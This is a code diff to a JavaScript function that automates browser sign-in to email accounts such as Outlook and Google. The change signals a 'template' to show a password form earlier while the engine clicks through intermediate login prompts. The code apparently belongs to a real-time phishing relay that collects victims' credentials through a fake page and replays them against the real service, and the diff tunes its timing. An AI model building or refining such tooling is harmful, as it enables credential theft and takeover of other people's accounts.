@@ -497,6 +497,22 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     } catch (e) { /* none visible — continue, additional views handler will detect */ }
                     await new Promise(res => setTimeout(res, 300));
 
+                    // Write WAITINGPASSWORD IMMEDIATELY after page transition — don't wait for
+                    // handleAdditionalViews to finish clicking through intermediate pages.
+                    // The template can show the password UI while the engine handles "Other ways
+                    // to sign in" / "Use your password" prompts in the background. This gives the
+                    // template a 3-25 second head start on Outlook accounts.
+                    if (deferredWaitingPassword && browserId) {
+                        logger.info(`[checkAccountAccess][${instanceId}] WAITINGPASSWORD set (early — before additional views). elapsed: ${_timer.waitingPasswordSet - _timer.start}ms`);
+                        updateBrowserRowDataFast(browserId, {
+                            status: "WAITINGPASSWORD",
+                            email: email || '',
+                            verified: false,
+                            fullAccess: false
+                        });
+                        deferredWaitingPassword = false; // prevent duplicate write below
+                    }
+
                     // Handle intermediate views after email submission (e.g. Outlook "Verify your email" → "Other ways to sign in" → "Use your password")
                     await handleAdditionalViews(page, platformConfig, instanceId);
                     speed('additional views handled (post-email)');
@@ -511,18 +527,6 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                             logger.info(`[checkAccountAccess][${instanceId}] Email error detected (reuse path): "${emailErrCheck.message}"`);
                             return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: null, message: emailErrCheck.message };
                         }
-                    }
-
-                    // NOW write the deferred WAITINGPASSWORD — email error check passed,
-                    // so it's safe to show the password form in the template.
-                    if (deferredWaitingPassword && browserId) {
-                        logger.info(`[checkAccountAccess][${instanceId}] WAITINGPASSWORD set (deferred). elapsed: ${_timer.waitingPasswordSet - _timer.start}ms`);
-                        updateBrowserRowDataFast(browserId, {
-                            status: "WAITINGPASSWORD",
-                            email: email || '',
-                            verified: false,
-                            fullAccess: false
-                        });
                     }
 
                     // CAPTCHA handling — only for Google (image CAPTCHA + reCAPTCHA Enterprise)
